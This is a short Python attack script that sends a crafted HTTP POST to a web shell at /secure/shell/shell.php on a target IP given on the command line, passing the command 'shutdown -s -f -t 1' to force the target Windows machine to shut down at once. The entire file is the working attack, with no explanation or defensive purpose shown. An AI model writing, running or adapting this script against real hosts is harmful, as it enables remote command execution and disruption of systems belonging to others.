import socket,sys

def f(ip,cmd):
    return '''POST /secure/shell/shell.php?shell=command HTTP/1.1\r
Host: ''' + ip + '''\r
Content-Length: 33\r
Cache-Control: max-age=0\r
Origin: http://''' + ip + '''\r
Upgrade-Insecure-Requests: 1\r
Content-Type: application/x-www-form-urlencoded\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r
DNT: 1\r
Referer: http://''' + ip + '''/secure/shell/shell.php?shell=command\r
Accept-Encoding: gzip, deflate\r
Accept-Language: zh-CN,zh;q=0.9\r
Connection: close\r
\r
cmd=''' + cmd + '''&textarea=\r
'''

ip = sys.argv[1]

cmd = 'shutdown+-s+-f+-t+1'

s = socket.socket()
s.connect((ip, 80))
c=f(ip,cmd)
s.send(c.encode('ascii'))
s.recv(1024)
s.close()
